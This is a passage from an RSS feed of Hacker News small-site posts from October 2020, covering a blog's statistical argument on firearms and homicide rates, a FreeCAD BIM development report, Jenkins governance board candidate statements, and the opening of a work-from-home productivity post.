<p>For further evidence firearms aren’t correlated with violence, it’s possible to directly compare the number of firearms vs homicides:<a href="https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5.png" alt="" width="1107" height="687" srcset="https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5.png 1107w, https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5-300x186.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5-1024x635.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5-768x477.png 768w" sizes="(max-width: 1107px) 100vw, 1107px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5.png 1107w, https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5-300x186.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5-1024x635.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Firearms-vs.-Homicides-per-100k-Inhabitants5-768x477.png 768w"></a>Across the bottom of the chart you can see all the countries with high homicide rates. The United States stands out clearly, if firearms were correlated with homicides we’d expect the U.S. to have many more homicides than it currently does. It does not appear more firearms are correlated with more homicides, in fact the trend line shows the opposite to be true (more firearms are correlated to less homicides).</p>
<p>For a final validation, we can compare firearms against homicides and firearm homicides against total homicides. Both should have a similar growth rate, if there was a correlation.</p>
<figure id="attachment_3617" aria-describedby="caption-attachment-3617"><a href="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1.png" alt="" width="1107" height="687" srcset="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1.png 1107w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1-300x186.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1-1024x635.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1-768x477.png 768w" sizes="(max-width: 1107px) 100vw, 1107px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1.png 1107w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1-300x186.png 300w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1-1024x635.png 1024w, https://austingwalters.com/wp-content/uploads/2020/10/Homicide-Rate-Log-vs.-Homicide-Rate-by-Firearm-Log-United-States1-768x477.png 768w"></a><figcaption id="caption-attachment-3617">* United States represented by a Star</figcaption></figure>
<p>It’s important to note the graph is a logarithmic comparison for homicides and homicides by firearm (firearms per 100k Inhabitants are not logarithmic). The trend line comparison of Total Homicides and Homicides by Firearm is linear, because the comparison is logarithmic, it appears exponential on the chart.</p>
<p>It is clear as homicides increase, homicides by firearm increase (blue data points). In contrast, when there are more firearms, homicides by firearm remain flat (purple data points), implying more firearms do not cause increase the number of homicides involving a firearm.</p>
<p>Further, you can see the blue star representing the United States homicide rate to homicide firearm deaths is right where it is expected. However, the purple star, representing the United States homicide rate to firearms per 100k inhabitants, is way outside the norm.</p>
<p>To summarize,</p>
<blockquote><p>Globally, as the firearm homicide rate increases, the total homicide rate increases; as the prevalence of firearms increase, the homicide rate <span>does not increase</span>.</p></blockquote>

<p>The United States is clearly the largest holder of firearms in the world, most states have more firearms than entire countries. Fun fact:</p>
<blockquote><p>Texans and the Chinese military have the same number of firearms.</p></blockquote>
<p>Clearly, there’s a culture of gun ownership in the United States. When the United States was formed it had just fought a war of independence and regularly combated Native Americans, settling North America by force. Even today, the <a href="https://en.wikipedia.org/wiki/United_States_National_Guard" target="_blank" rel="noopener noreferrer">United States National Guard</a> is one of the largest militias in the world.</p>
<blockquote><p>A well regulated Militia, being necessary to the security of a free State, the right of the people to keep and bear Arms, shall not be infringed.<br>
–<a href="https://constitution.congress.gov/constitution/amendment-2/"> Constitution of the United States</a></p></blockquote>
<p>Without diving into politics, the constitution &amp; culture has enabled the United States to be relatively unique. Firearms are regulated, but just barely. Generally, citizens can do everything from carrying a firearms in public to purchasing assault rifles, flamethrowers, <a href="https://en.wikipedia.org/wiki/Minigun" target="_blank" rel="noopener noreferrer">miniguns</a>, rocket launcher(s), etc. Often the only requirement is obtaining permit to own weapons, after that you can regularly purchase as many firearms as you’d like.</p>
<p>As seen in the previous section, the United States does have a higher (on average) number of firearm deaths. However, this doesn’t necessarily tell the whole story. In the prior section, we focused on the homicide rate. In the following sections, the focus will expand as uniform data collection, similar social norms and a widespread framework for law makes comparisons much easier.</p>
<p>Some topics we will explore here are:</p>
<ul>
<li>Suicide vs homicide vs accidental rates</li>
<li>The type of weapons used in homicides</li>
<li>How demographics impact firearm fatalities</li>
<li>How firearm fatalities compare to other fatalities</li>
</ul>
<h2><span id="Suicides_Homicides_in_the_United_States"></span>Suicides &amp; Homicides in the United States<span></span></h2>
<p>First, it is also important to highlight just how small the number of firearm related homicides really are, when compared to all deaths. On average, the total (suicide, homicide &amp; accidental) number of firearm related fatalities account for about 1.33% of all deaths in the United States (firearm related homicides account for ~0.44% of all deaths) and it varies wildly between states.</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/10/2015-U.S.-Deaths-per-State-normal.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/10/2015-U.S.-Deaths-per-State-normal.png" alt="" width="736" height="855" srcset="https://austingwalters.com/wp-content/uploads/2020/10/2015-U.S.-Deaths-per-State-normal.png 736w, https://austingwalters.com/wp-content/uploads/2020/10/2015-U.S.-Deaths-per-State-normal-258x300.png 258w" sizes="(max-width: 736px) 100vw, 736px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/10/2015-U.S.-Deaths-per-State-normal.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/10/2015-U.S.-Deaths-per-State-normal.png 736w, https://austingwalters.com/wp-content/uploads/2020/10/2015-U.S.-Deaths-per-State-normal-258x300.png 258w"></a></p>
<p>Perhaps the most important item to discuss is the “<em>firearm fatality rate</em>“, often conflated with the “<em>firearm homicide rate</em>” by political pundits. While all fatalities are unfortunate, most American’s would argue there is a different between <em>suicides</em> and <em>homicides</em>. Some states, such as Washington, support medically assisted suicides (for the terminally ill).</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://austingwalters.com/firearms-by-the-numbers/">https://austingwalters.com/firearms-by-the-numbers/</a></em></p>]]>
            </description>
            <link>https://austingwalters.com/firearms-by-the-numbers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24951316</guid>
            <pubDate>Sat, 31 Oct 2020 13:30:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[FreeCAD BIM development news]]>
            </title>
            <description>
<![CDATA[
Score 80 | Comments 21 (<a href="https://news.ycombinator.com/item?id=24951311">thread link</a>) | @buovjaga
<br/>
October 31, 2020 | https://yorik.uncreated.net/blog/2020-011-freecad-september | <a href="https://web.archive.org/web/*/https://yorik.uncreated.net/blog/2020-011-freecad-september">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">

        
    

    <div id="main">

         
        

        <div>
            
            
            <p><img src="https://yorik.uncreated.net/images/2020/freecad-09-01.jpg" alt=""></p>
<p>Hi all,</p>
<p>After a very, very long delay, here comes finally another development report about the <a href="https://github.com/yorikvanhavre/BIM_Workbench">BIM tools</a> for <a href="https://www.freecadweb.org/">FreeCAD</a>. Awfully sorry about the black-out during these last months, lots of things <a href="https://www.rtbf.be/info/regions/liege/detail_circuit-de-spa-francorchamps-80-millions-d-investissements-et-le-retour-de-la-moto?id=10604892">happened</a> (all the 3D&amp;BIM done with FreeCAD and Blender) and  of course the pandemic didn't ease things either. Anyway, that doesn't mean nothing happened on the FreeCAD front, on the contrary, bugs still get addressed, things get fin-tuned, ideas get discussed, and FreeCAD gets everyday better.</p>
<p>This last month we also had a hectic turnover, because Autodesk changed the terms of the free version of  their <a href="https://www.autodesk.com/products/fusion-360/overview">Fusion360</a>. There is a full load of new limitations that restrain much the use for personal/hobby users. For example, the g-code you export from Fusion360 to CNC machines (that cut objects out of a block of material), is now making the machine running slower (and therefore raising the production costs), for no apparent reason other than nagging the users into buying a subscription. As a result, we saw a massive migration of users to FreeCAD, and it's really thrilling to see people discovering FreeCAD and learning it and liking it.</p>
<p>Thanks once more to everybody who contributes to my <a href="https://www.patreon.com/yorikvanhavre">Patreon</a> or <a href="https://liberapay.com/yorik/">Liberapay</a> campaigns, I'm really grateful you guys didn't just drop me away when I fail to write for 3 months.</p>
<p>Also, for who didn't notice, FreeCAD now has a proper <a href="https://liberapay.com/FreeCAD/">Liberapay teams account</a> where all money received is divided equally between the FreeCAD developers registered there (currently 7). This account has seen a huge raise of donations these last weeks (it receives around 1000 USD/month at the moment), thanks to the flow of new ex-Fusion360 users, and the impressive job Kunda1 is doing on <a href="https://twitter.com/FreeCADNews">the official FreeCAD twitter account</a> (subscribe to it if you are a twitter user, that account used to be just a mirror of the FreeCAD Facebook page, but is now very, very well maintained) and the campaigning of other people (special thanks to my <a href="https://www.twitter.com/beatnikqueen">girlfriend</a>, the most awesome person in the world).</p>
<p>So, no more loitering, to the news! Here is what we got this month:</p>
<h3>Customizable section color</h3>
<p><img src="https://yorik.uncreated.net/images/2020/freecad-09-02.jpg" alt=""></p>
<p><a href="https://wiki.freecadweb.org/Arch_SetMaterial">Materials</a> now have a new <strong>Section Color</strong> property, which allows to give a different color when the material is viewed and when it is cut through. So for example you can now have your walls appear white when viewed, but black when cut and seen on a TechDraw page.</p>
<p>This is a small improvement so far, but it laid the structure to have more advanced things, such as supporting hatch patterns. The main problem for this, is that, although the SVG format has an excellent support for hatch patterns (anything can become a hatch pattern, even bitmap images), the Qt implementation of the SVG format lacks support for it (it has its own <a href="https://doc.qt.io/Qt-5/qbrush.html#details">system</a> but it's not very practical to make that compatible with SVG). Therefore at the moment we have no clear idea of how to go further.</p>
<p><a href="https://wiki.freecadweb.org/TechDraw_Module">TechDraw</a>'s implementation of hatch patterns internally recreates OpenCasCade geometry, which works very well but might be heavy for large BIM models. In any case, that's a track I'm <a href="https://github.com/yorikvanhavre/FreeCAD/tree/td-makedrawgeomhatch">exploring</a> too.</p>
<h3>Default windows are now openable</h3>
<p><img src="https://yorik.uncreated.net/images/2020/freecad-09-03.jpg" alt=""></p>
<p>Another very small fix, but the default door and windows created with the <a href="https://wiki.freecadweb.org/Arch_Window">Door and windows tools</a> now have a hinge edge defined, so their <strong>Opening</strong> property now works out-of-the-box. It might not open in the direction you want, though, so you might still need to tweak this. But next items on my list are adding a couple of controls to easily switch opening directions.</p>
<h3>Default pattern size option</h3>
<p><img src="https://yorik.uncreated.net/images/2020/freecad-09-04.jpg" alt=""></p>
<p>The Draft patterns system is now working again (hatch patterns can be added to all closed Draft objects such as rectangles, polylines, circles, etc). I also added a preferences option under <em>Edit -&gt; Preferences -&gt; Draft -&gt; Visual settings</em> to set a default hatch pattern scale, which is useful when you always work with objects of a similar size range, for example building plans. I still have to experiment a bit (0.0025 seems like a very good default setting for BIM), but will add that to the BIM setup screen once I found a couple of good settings.</p>
<h3>Section plane label</h3>
<p><img src="https://yorik.uncreated.net/images/2020/freecad-09-05.jpg" alt=""></p>
<p><a href="https://wiki.freecadweb.org/Arch_SectionPlane">Section planes</a> now have a <strong>Show Label</strong> property, which, when turned on, show the section plane label on the plane in the 3D view. This is useful to easily identify these section planes when there are many in your document. The text size currently depends on the arrow size, but I'll make all this better customizable later on.</p>
<p>We have further plans too for the section planes, such as be able to double-click or activate them somehow, and find yourself in a separate 2D view with all needed geometry cut or turned off, where you can still work on the model in a 2D environment. This would be a bit like an intermediary step between the full 3D model and a TechDraw view. You can see a first draft of that coded by Carlo Pavan on the experimental tools palette in the BIM workbench.</p>
<h3>TechDraw tools in BIM workbench</h3>
<p><img src="https://yorik.uncreated.net/images/2020/freecad-09-06.jpg" alt=""></p>
<p>Among the annotation tools on the BIM workbench, you'll now find two TechDraw tools, <strong>Create page</strong> and <strong>Create view</strong>. The first one is the same of the <a href="https://wiki.freecadweb.org/TechDraw_PageTemplate">Create page from template</a> TechDraw tool, except that it remembers the last template you used and gets you right there when you use the tool again, so it gives a little bit faster workflow. The second tool is currently the same as the <a href="https://wiki.freecadweb.org/TechDraw_ArchView">TechDraw ArchView tool</a> but I plan to make it a bit more flexible in the future so it would become a mix of TechDraw's ArchView and DraftView tools, depending on the selected objects.</p>
<h3>TSV export</h3>
<p>The <a href="https://wiki.freecadweb.org/Arch_Schedule">Schedule</a> tool has been extended to now allow to export results to the .tsv (Tab-Separated Values) format, which is basically the same as the .csv (Comma-Separated Values) format, but using tab characters to separate columns, instead of commas. The big problem of csv, of course, is if there are commas in the columns texts. Usually spreadsheet apps are pretty tolerant with .csv files, they will usually ask you what character to consider as column separator on import, but others (for example GitHub) doesn't display them correctly if they don't use a comma as separator. So from now on there is a correct way to please everybody <i></i></p>
<h3>Blender exporter upgrade</h3>
<p><img src="https://yorik.uncreated.net/images/2020/freecad-09-07.jpg" alt=""></p>
<p>The <a href="https://gist.github.com/yorikvanhavre/029f6fcce9f4d0e62fb6163804b7f80d">FreeCAD exporter for Blender</a> has seen several small fixes, it now automatically adds the .FCStd extension to the generated file if you haven't added it yourself, it now correctly handles object rotation and scaling, and it applies modifiers before exporting. It now also supports faceless objects (wireframe objects).</p>
<p>This coupled with the <a href="https://blenderbim.org/">BlenderBIM</a> improvements, it now becomes increasingly easy to work on BIM models in Blender, or parts of BIM models, and when needed, integrate everything seamlessly in FreeCAD. There are many more joint FreeCAD/Blender developments going on, such as the new <a href="https://forum.freecadweb.org/viewtopic.php?style=4&amp;t=51069&amp;p=438881">Sverchok nodes</a> that use FreeCAD internally, literally creating a kind of new interface for FreeCAD withing Blender.</p>
<h3>Detect and suggest development version</h3>
<p>The BIM workbench will now detect your FreeCAD version on the setup screen, and suggest you to install a development version if you are not using one. This will help people to be aware of the existence of development versions, and become more used to them and how to install and mange them.</p>
<h3>Grid extension setting in Working Plane panel</h3>
<p>The overall size of the grid is now settable directly from the <a href="https://wiki.freecadweb.org/Draft_SelectPlane">Working Plane</a> task panel.</p>
<h3>Multiple custom folders on start page</h3>
<p><img src="https://yorik.uncreated.net/images/2020/freecad-09-08.jpg" alt=""></p>
<p>The <a href="https://wiki.freecadweb.org/Start_Workbench">start page</a> can now show multiple custom folders. To achieve that, go to the start page preferences under menu <em>Edit -&gt; Preferences -&gt; Start</em> and instead of choosing one custom folder, type manually several folder paths, separated by ;;</p>
<p>For example: <code>/home/yorik;;/home/yorik/Examples;;/home/yorik/FreeCAD/Examples</code></p>
<h3>Image Plane scaling</h3>
<p><img src="https://yorik.uncreated.net/images/2020/freecad-09-09.jpg" alt=""></p>
<p>The <a href="https://wiki.freecadweb.org/Draft_Scale">Draft Scale</a> tool now support image planes created with the <a href="https://wiki.freecadweb.org/Image_Module">Image workbench</a>. So it is now easy to import reference images such as scanned floor plans, position them on a common reference point, and scale them to the desired size.</p>
<h3>Unit and Show Unit in Draft dimension preferences</h3>
<p>You can now set default value for these two settings under <em>Edit -&gt; Preferences -&gt; Draft -&gt; Dimensions and Texts</em>, that will affect all newly created dimensions.</p>
<h3>Manual upgrade</h3>
<p>And last but not least, I started upgrading the <a href="https://wiki.freecadweb.org/Manual">manual</a> to FreeCAD 0.19, and this time I intend well to produce a printed book with it. To be continued!</p>
<p>That's it for this month I guess, I promise to do everything I can to resume posting once per month!</p>
<p>Cheers</p>
<p>Yorik</p>
            
        </div>

                
            </div>


        
    
    </div></div>]]>
            </description>
            <link>https://yorik.uncreated.net/blog/2020-011-freecad-september</link>
            <guid isPermaLink="false">hacker-news-small-sites-24951311</guid>
            <pubDate>Sat, 31 Oct 2020 13:30:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[2020 Elections: Governance Board and Officer Candidates]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24951253">thread link</a>) | @based2
<br/>
October 31, 2020 | https://www.jenkins.io/blog/2020/10/28/election-candidates/ | <a href="https://web.archive.org/web/*/https://www.jenkins.io/blog/2020/10/28/election-candidates/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<h3 id="andrey-falko"><a href="#andrey-falko"></a>Andrey Falko</h3>

<p>With this nomination, I hope to continue helping strengthen and
progress the community further. As a member of the governance board,
I’ll bring a fresh perspective by asking questions, providing feedback,
and finding opportunities for others to contribute.</p>

<p>Affiliations: Stripe</p>
</div>
<div>
<h3 id="ewelina-wilkosz"><a href="#ewelina-wilkosz"></a>Ewelina Wilkosz</h3>
<p>As a consultant I support my customers with their Jenkins issues since the beginning of 2017.
And almost from the start it was some kind of "as code" approach.
The experience I gained during that time resulted in getting myself involved in the development of Configuration as Code Plugin for Jenkins.
I consider becoming a part of Jenkins Community one of the most valuable experiences in my career so far.
I appreciate how much I have learned and how welcoming the community is.</p>
<p>I am not a very active contributor these days, at least when it comes to code, but what I have to offer is rather extensive experience
with Jenkins end users - from small, single instance setups to environments with hundreds of controllers run in a different way on different operating systems.
Every day I see pains those users go through, I know what issues they are facing and which features they consider valuable or missing.
As a Jenkins Governance Board Member I can represent those users.</p>
<p>Thanks to my involvement in Configuration as Code Plugin development
I had a chance to deliver a number of public presentations
where I focused on the benefits of the solution and tried to make it easier for newcomers to try it.
Here are a few examples of my activities related to Jenkins Configuration as Code:
<a href="https://www.praqma.com/stories/start-jenkins-config-as-code/">blogpost</a>,
<a href="https://www.youtube.com/watch?v%3DwTzljM-EDjI">cdCON presentation</a>,
<a href="https://open.spotify.com/episode/4beEdOeirazc65AdEARIOM?si%3DY63V4gBDT02_UBMQ3vahvg">podcast recording</a>.
So my focus is not only on representing users but also on educating them, and educating myself,
so I actually know what they need and why.</p>

<p>Affiliations: Eficode (former Praqma)</p>
</div>
<div>
<h3 id="frederic-gurr"><a href="#frederic-gurr"></a>Frederic Gurr</h3>
<p>I started to use Jenkins back in 2008, when it still had a different name.
In 2011 I started to contribute and created my first little plugin called
<a href="https://plugins.jenkins.io/extra-columns/">extra-columns</a>.
Since then, using and administering Jenkins servers has become a major part of my work life,
while getting involved with the Jenkins community
kickstarted my interest and involvement with open source software and communities.</p>
<p>I’ve been working as a release engineer at the <a href="https://www.eclipse.org/">Eclipse Foundation</a>&nbsp;since 2016,
supporting 250+ Jenkins instances for various open source projects.
I’d be honored to bring a user and admin oriented perspective to the Governance Board and help
shape the future of Jenkins.</p>

<p>Affiliations: Eclipse Foundation</p>
</div>
<div>
<h3 id="gavin-mogan"><a href="#gavin-mogan"></a>Gavin Mogan</h3>
<p>I got started with Jenkins early on when I was just getting started with testing.
I knew there had to be a way to run the tests automatically and report on them back to people.
I started hacking my own tools before I came across Jenkins (then Hudson) and was hooked ever since.
Over the years I’ve managed to install and configure Jenkins at various jobs,
and even was employed making internal and external plugins and integrations.
You’ll often find me on the Jenkins IRC and Gitter channels as well as the subreddit giving a hand to people who are stuck.
I also try to get involved with Jenkins Infrastructure projects as much as I can.
I currently maintain the plugin site, plugin site API, Jenkins Wiki exporter, and a bunch of other minor projects.
I also help run Vancouver’s chapter of Nodeschool.</p>
<p>If elected, I would like to address improving commercial support avenues.
Right now it’s a lot of people flailing in isolation.
I would like to not only improve things so people can find easier ways to get help,
but also encourage more users to help others, and push for a
centralized source of companies providing commercial support.</p>

<p>Affiliations: Digital Ocean, Nodeschool Vancouver</p>
</div>
<div>
<h3 id="justin-harringa"><a href="#justin-harringa"></a>Justin Harringa</h3>
<p>The nomination is quite an honor for me.
I have been a Hudson/Jenkins user since around 2009/2010 when
I started working through driving continuous integration in a corporate environment at John Deere.
As time went on, I began contributing some small fixes to plugins such as the Job DSL Plugin, OpenID Plugin, and the Workflow Job Plugin.
Eventually, I ended up helping maintain Salesforce’s Chatter plugin and then open sourcing plugins such as the Config-Driven Pipeline Plugin with Andrey Falko.
More recently, I have also had the extreme pleasure of mentoring in 2 Jenkins projects for Google Summer of Code
(Multi-branch Pipeline support for Gitlab in 2019 and Git Plugin Performance Improvements in 2020).</p>
<p>I have learned so much from working with Jenkins and I would love to give back to the project further.
Having introduced Jenkins at both small and large companies,
I would love to help contribute to the direction of the project through the Roadmap/SIGs/JEPs and encourage others to also contribute / improve Jenkins.</p>

<p>Affiliations: Salesforce, Spinnaker SIG for Azure</p>
</div>
<div>
<h3 id="mark-waite"><a href="#mark-waite"></a>Mark Waite</h3>
<p>I’m a Jenkins contributor, a member of the Jenkins core team,
one of the leaders of the Platform Special Interest Group,
and leader of the Documentation Special Interest Group.
I’ve served as the Jenkins Documentation Officer since 2019.
I was a mentor for Google Season of Code 2020 and am one of the maintainers of the Git plugin for Jenkins.</p>
<p>If elected and allowed to serve on the Jenkins Board, I’ll work to increase community involvement and community development.
I’m deeply interested in tooling and environments that support the Jenkins project,
including the Jenkins CI environments, issue tracker, artifact repository, and source code repositories.</p>

<p>Affiliations: CloudBees</p>
</div>
<div>
<h3 id="marky-jackson"><a href="#marky-jackson"></a>Marky Jackson</h3>
<p>I have been involved in the Jenkins project for many years.
I started out as a plugin maintainer, SIG member and general helper.
I moved to a SIG lead, speakers and Google Summer of Code and Docs org admin and mentor.
My current goals are to help continue the work of the public roadmap as well and gain most community members by continuing to be a champion of the community.</p>
<p>For me, being on the Jenkins Board is another opportunity to improve upon the great work
we have all done as well as work toward branching out our efforts to have more women, people of color and LGBTQIA members.
I would be honored to have this opportunity.</p>

<p>Affiliations: OpsMx, Continuous Delivery Foundation, Kubernetes, Ortelius, Spinnaker</p>
</div>
<div>
<h3 id="steven-terrana"><a href="#steven-terrana"></a>Steven Terrana</h3>
<p>I have been a Jenkins user since 2017 and contributor since 2018.
I am the primary maintainer of the Jenkins Templating Engine,
a plugin that allows users to create truly templated Jenkins pipelines that can be shared across teams.
Through that work, I’ve had the great pleasure of helping to organize the Pipeline Authoring Special Interest Group,
contributing to the Jenkins Pipeline documentation, and contributing bug fixes to various plugins
(including the pipeline plugin and workflow-cps library).</p>
<p>As a Continuous Delivery Foundation Ambassador,
I’ve enjoyed doing what I can to advance the community’s approach to CI/CD and simplifying DevSecOps adoption within large organizations.
It would be a privilege to serve on the Jenkins Governance Board and offer my support wherever I can.</p>

<p>Affiliations: Booz Allen Hamilton, Continuous Delivery Foundation</p>
</div>
<div>
<h3 id="zhao-xiaojie-rick"><a href="#zhao-xiaojie-rick"></a>Zhao Xiaojie (Rick)</h3>
<p>Three years ago I joined the Jenkins community.
I learned a lot during the process of contributing.
I even became a Jenkins hero in my city.
The most exciting thing I want to do is help more new users of Jenkins get started, and let more contributors feel comfortable.
I always love to host a JAM no matter if it’s online or offline.</p>
<p>Plans: improve the experience of using Jenkins in different
countries; reorganize the knowledge of Jenkins, for example the tutorial
by text or video format; help other SIG leaders to organize meetings.</p>

<p>Affiliations: N/A</p>
</div>
</div></div>]]>
            </description>
            <link>https://www.jenkins.io/blog/2020/10/28/election-candidates/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24951253</guid>
            <pubDate>Sat, 31 Oct 2020 13:22:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to be as (or more) productive while working from home]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24951167">thread link</a>) | @justanotherpm
<br/>
October 31, 2020 | https://blog.justanotherpm.com/if-you-think-productivity-in-office-productivity-at-home-you-are-not-alone-but-that-can-be-changed/ | <a href="https://web.archive.org/web/*/https://blog.justanotherpm.com/if-you-think-productivity-in-office-productivity-at-home-you-are-not-alone-but-that-can-be-changed/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
<div>
    <main>
            <article>
    
    <div>
            <p>"What should I do for lunch? Too lazy to get take-out, no clean dishes to cook."</p><p>"If the amazon delivery gets here during a meeting, should I excuse myself? Or, switch off video."</p><p>"I need to take a break, and have enough time to play one game of FIFA."</p><p>"How the hell is she so motivated and well dressed every day? I can hardly get out of bed and brush my teeth before the first meeting."</p><p>"I am tired already, will anyone notice if I log off at 2 PM?"</p><p>👆 is a snapshot of the thoughts I've had in the last 30+ weeks of work from home. The actual list is much longer, but let's not go there.</p><p>For almost six weeks now, I have felt that my productivity is lesser than what it was earlier. But the thing with productivity is that there is no scientific measure for it, nor is there a universal scale to determine how productive is productive enough for a superstar PM. (Yes, I think of myself as a superstar PM 😛)</p><p>To give some meaning to the said feeling, I decided to investigate further.</p><p>The goal was to design a system to measure my productivity, identify factors that negatively affect it and develop a method to keep it high.</p><p>TLDR:</p><ol><li>My mood at the end of the workday is a representation of how productive I was on that day - &nbsp;good mood equals a highly productive day. A low <em>task completion rate</em> and <em>high task completion time</em> negatively affected my productivity and my mood.</li><li>I lose focus more easily working from home than working from the office. This has a direct impact on the completion rate and completion time. I, then, identified the triggers that lead me to lose focus. [Read questions at the top.]</li><li>I researched productivity hacks and shortlisted the ones that I think could work for me.</li></ol><p>Deep dive:</p><h2 id="how-to-measure-productivity">How to measure productivity?</h2><p>There is no easy way for me to estimate productivity objectively. And that doesn't worry me. So I chose to limit the measures to subjective criteria like work-related mood and a sense of achievement at the end of the day.</p><p>I am the only one measuring my productivity. There are no external persons who can influence the measurement. Most importantly, I have no incentive to cheat or to justify it to anyone. Hence, this system works. It helps me track directional changes to productivity. As long as I am progressing in the right direction, I am happy.</p><h2 id="why-do-i-lose-focus-more-often-at-home-vs-the-office">Why do I lose focus more often at home vs the office?</h2><p>There are too many variables at home. [Read questions at the top.]</p><p>There is no standard start and end to my day. I start 15 minutes before my first meeting and only stop when I am exhausted. Not having an end time makes me more lenient about micro deadlines. And that leniency triggers the part of the brain which prefers getting distracted.</p><p>This was very different in a physical office.</p><ul><li><strong>The 20-minute commute to the office</strong> helped me prepare for my day, and the commute back helped me unwind and shutdown. The commute primed me to switch on and off, with enough prep time on both ends. The only commute I have now is from the bathroom to the living room.</li></ul><figure><img src="https://blog.justanotherpm.com/content/images/2020/10/image-11.png" alt=""></figure><ul><li><strong>Grabbing a coffee and partaking in random kitchen chats</strong> provided me with much required breaks. And the one guy who is always eager to return to work motivated me to do the same.</li></ul><figure><img src="https://blog.justanotherpm.com/content/images/2020/10/image-10.png" alt=""></figure><ul><li><strong>Working with others around me created positive peer pressure, </strong>which helped me focus and do more.</li><li><strong>Physically stepping out of the office</strong> helped me close one - and start the next - chapter of the day.</li></ul><figure><img src="https://blog.justanotherpm.com/content/images/2020/10/image-14.png" alt=""></figure><ul><li><strong>Seeing people leave the office earlier than me </strong>signalled that the end is near, and I should start wrapping up my day.</li></ul><figure><img src="https://blog.justanotherpm.com/content/images/2020/10/image-15.png" alt=""></figure><h2 id="how-am-i-increasing-my-productivity-at-home">How am I increasing my productivity at home?</h2><p>I am sharing ten methods to increase productivity during WFH. I divided them into two lists: first includes the tried and tested methods. The second list contains methods that I am yet to try.</p><h3 id="tried-and-tested-methods-">Tried and tested methods:</h3><ul><li><strong>The </strong><a href="https://en.wikipedia.org/wiki/Pomodoro_Technique"><strong>Pomodoro Technique</strong></a><strong> </strong>works miracles for me. I highly recommend it. I am more efficient with my tasks when there is a timer counting down. For those who are not aware - the Pomodoro Technique is a time management method. It breaks down work into intervals of 25 minutes in length. Each interval, known as the Pomodoro, is separated by a short break (typically of 5 minutes).</li><li>I am not fond of being late. Ever. I use that to my advantage by <strong>creating and advertising time-bound goals</strong>. For example, suppose the engineers need a document by Friday. In that case, I commit (in front of the entire team) to deliver it by Wednesday. The ambition to fulfil my commitments keeps me focused for longer periods of time.</li><li><strong>Having something to look forward to at the end of the day</strong> keeps me efficient all day. I play football on Wednesday evenings, and miraculously I am the most productive on Wednesdays.</li><li><strong>A comfortable home office is quintessential. </strong>The most important part of the home office - something that I learned the hard way - is a comfortable chair. If you don't already have one, buy one right now. Thank me later.</li><li><strong>Keep your home office organized and clean</strong>. Cluttered and messy workspaces are a real motivation killer.</li></ul><figure><img src="https://blog.justanotherpm.com/content/images/2020/10/WhatsApp-Image-2020-10-30-at-9.18.21-PM.jpeg" alt="" srcset="https://blog.justanotherpm.com/content/images/size/w600/2020/10/WhatsApp-Image-2020-10-30-at-9.18.21-PM.jpeg 600w, 